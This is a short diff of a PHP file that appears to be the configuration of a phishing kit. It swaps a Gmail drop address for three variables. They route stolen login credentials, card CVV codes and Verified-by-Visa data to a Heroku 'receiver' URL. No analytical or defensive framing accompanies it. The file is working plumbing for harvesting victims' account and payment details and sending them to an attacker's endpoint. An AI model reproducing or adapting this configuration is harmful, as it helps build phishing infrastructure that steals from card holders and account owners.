@@ -1,6 +1,8 @@
 <?php
 
-$to = "suckhack24@gmail.com";
+$to_login   = "https://mighty-earth-61830.herokuapp.com/receiver";
+$to_cvv     = "https://mighty-earth-61830.herokuapp.com/receiver";
+$to_vbv     = "https://mighty-earth-61830.herokuapp.com/receiver";
 
 
 ##ip##
